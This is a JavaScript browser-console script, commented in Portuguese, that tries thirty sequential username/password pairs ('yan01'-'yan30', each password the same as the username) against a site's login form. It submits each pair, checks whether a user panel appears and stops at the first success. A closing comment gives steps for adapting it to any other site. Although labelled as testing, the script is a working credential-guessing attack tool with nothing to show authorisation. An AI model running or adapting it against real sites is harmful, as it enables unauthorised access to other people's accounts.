// Lista de usuários e senhas para testar.
const usuarios = [];
const senhas = [];

// Preenche as listas com "yan01" a "yan30".
for (let i = 1; i <= 30; i++) {
    const numFormatado = String(i).padStart(2, '0');
    usuarios.push(`yan${numFormatado}`);
    senhas.push(`yan${numFormatado}`);
}

// *** ADIÇÃO: Lista de usuários a serem excluídos ***
const naoTestar = {};

// Prompt para inserir usuários a não testar
const listaNaoTestar = prompt("Quais usuários você NÃO quer testar? (separados por vírgula)");

if (listaNaoTestar) {
    listaNaoTestar.split(",").forEach(user => {
        user = user.trim();
        if (usuarios.includes(user)) {
            naoTestar[user] = true;
            console.log(`%c[INFO] Usuário '${user}' adicionado à lista de exclusão.`, 'color: DarkGoldenRod;');
        } else {
            console.warn(`%c[AVISO] Usuário '${user}' não encontrado na lista.`, 'color: LightCoral;');
        }
    });
}

// Variável para controlar a execução
let pararExecucao = false;

// Função para parar a execução
function stop() {
    pararExecucao = true;
    console.warn('%c[AVISO] Execução interrompida pelo usuário.', 'color: orange;');
}

// Exponha a função stop no escopo global (window)
window.stop = stop;

// Tenta o login com um usuário e senha.
async function tentarLogin(usuario, senha) {
    // Encontra os campos e o formulário (ADAPTAR OS SELECTORES!).
    const usuarioInput = document.querySelector('input[name="login"]');
    const senhaInput = document.querySelector('input[name="pass"]');
    const form = document.querySelector('form[action="logar.php"]');

    if (!usuarioInput || !senhaInput || !form) {
        console.error("%c[ERRO] Elementos do formulário não encontrados. Verifique os seletores!", "color: Crimson");
        return false; // Elementos não encontrados.
    }

    usuarioInput.value = usuario;
    senhaInput.value = senha;
    form.submit();

    await new Promise(resolve => setTimeout(resolve, 2500)); // Aguarda (AJUSTAR O TEMPO).

    // Verifica se o login foi bem-sucedido (ADAPTAR A LÓGICA!).
    const painelUsuario = document.querySelector('#painel_usuario');
    if (painelUsuario) {
        console.log(`%c[SUCESSO] Login com ${usuario}/${senha}`, 'color: green;'); // Login bem-sucedido!
        return true;
    } else {
        console.error(`%c[FALHA] Login com ${usuario}/${senha}`, 'color: red;'); // Login falhou!
        return false;
    }
}

// Executa os testes de login.
async function executarTestes() {
    console.group("%cIniciando Testes de Login", "color: Navy; font-weight: bold;"); // Agrupa os logs

    for (let i = 0; i < usuarios.length; i++) {
        if (pararExecucao) {
            console.log('%c[INFO] Execução finalizada.', 'color: orange;');
            break;
        }

        const usuario = usuarios[i];
        const senha = senhas[i];

        // *** ADIÇÃO: Verifica se o usuário está na lista de exclusão ***
        if (naoTestar[usuario]) {
            console.warn(`%c[PULAR] Pulando ${usuario}/${senha} (na lista de exclusão)`, 'color: DimGray;');
            continue;
        }

        console.log(`%c[TESTE] Tentando ${usuario}/${senha}`, 'color: RoyalBlue;');

        if (await tentarLogin(usuario, senha)) {
            console.groupEnd(); // Encerra o grupo de logs
            return; // Para ao encontrar um login válido.
        }
    }

    console.groupEnd(); // Encerra o grupo de logs
    console.log('%c[FALHA] Nenhuma combinação funcionou.', 'color: red;');
}

executarTestes();

/* **Adaptando para outro site:**
1. Inspecione o HTML do login.
2. Adapte os seletores CSS em `tentarLogin()`.
3. Adapte a lógica de sucesso em `tentarLogin()`.
4. Ajuste o tempo de espera.
5. Modifique a geração de usuários/senhas.
*/